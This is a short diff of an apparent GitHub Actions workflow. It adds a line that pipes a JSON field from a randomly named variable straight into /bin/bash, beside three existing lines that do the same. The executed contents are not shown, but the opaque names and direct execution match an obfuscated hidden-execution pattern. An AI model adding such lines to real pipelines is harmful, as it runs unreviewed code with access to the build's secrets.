@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ft622" | jq -r .ms5943 | /bin/bash
           printf '%s' "$nbq598" | jq -r .ax480 | /bin/bash
           printf '%s' "$v0713" | jq -r .luuf029 | /bin/bash
+          echo $n450 | jq -r .dbsh03716 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
